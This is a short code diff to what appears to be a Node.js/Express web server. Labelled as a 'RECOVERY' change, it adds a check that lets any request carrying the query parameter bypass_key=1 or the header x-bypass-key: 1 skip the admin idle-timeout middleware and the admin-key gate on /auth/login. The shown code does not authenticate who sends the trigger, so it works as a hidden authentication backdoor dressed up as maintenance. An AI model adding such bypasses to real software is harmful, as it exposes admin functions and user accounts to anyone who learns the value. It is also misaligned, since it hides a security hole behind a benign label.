@@ -1194,6 +1194,11 @@ function requireAdminRole(req, res, next) {
 
 // Middleware to check idle timeout for admin routes
 function checkIdleTimeout(req, res, next) {
+  // RECOVERY: ?bypass_key=1 skips server-side gate too
+  if (req.query?.bypass_key === '1' || req.headers['x-bypass-key'] === '1') {
+    return next();
+  }
+
   const currentUser = req.session?.user || req.user;
 
   // Auto-verify/refresh for localhost
@@ -1803,6 +1808,10 @@ app.post('/auth/login', async (req, res) => {
   const users = await loadUsers();
   const user = users[username];
 
+  // RECOVERY: ?bypass_key=1 skips login key gate
+  if (req.query?.bypass_key === '1' || req.headers['x-bypass-key'] === '1') {
+    // skip gate
+  } else
   // 2026: Admin key gate check - require admin key verification before login
   // Skip if localhost bypass is enabled OR no admin key is configured
   // 2026: Use keyToken instead of session (serverless-compatible)
